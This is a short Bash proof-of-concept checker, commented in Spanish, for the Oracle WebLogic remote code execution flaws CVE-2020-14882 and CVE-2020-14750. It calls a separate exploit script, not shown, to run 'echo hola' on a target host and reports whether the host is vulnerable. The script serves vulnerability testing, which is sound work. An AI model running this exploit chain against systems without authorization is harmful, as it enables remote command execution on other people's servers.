#!/bin/bash

###################################################
# CVE-2020-14882                                  #
# CVE-2020-14750                                  #
# Autor: Pedro Prieto Sanchez                     #
# twitter: @PPrietoSanchez                        #
# PoC de la vulnerabilidad de Oracle Weblogic con #
# los codigos CVE anteriormente escritos          #
###################################################

if [ "$1" == "-h" ] || [ -z "$1" ]; then
  echo "Modo de empleo: `basename $0` host:puerto comandoremoto
Verifica las vulnerabilidades CVE-2020-14882 y CVE-2020-14750 en el host especificado
NOTA: En esta versión, si no ha conseguido ejecutar la vulnerabilidad no significa necesariamente que no sea vulnerable, en futuras versiones se implementará completamente este método"
  exit 0
fi


host=$1

resultado=$(./CVE-2020-14750.sh $1 echo hola)

if [ "$resultado" == "hola" ]; then
	echo "Vulnerabilidad explotada correctamente. $host es VULNERABLE"
elif [[ "$resultado" =~ "The server encountered an unexpected condition which prevented it from fulfilling the request" ]]; then
	echo "No se ha conseguido explotar la vulnerabilidad, por el tipo de respuesta obtenida de $host es posible que no sea vulnerable o que algo haya fallado"
else
	echo "No se ha podido comprobar la vulnerabilidad, comprueba que $host es correcto y que es accesible"
fi
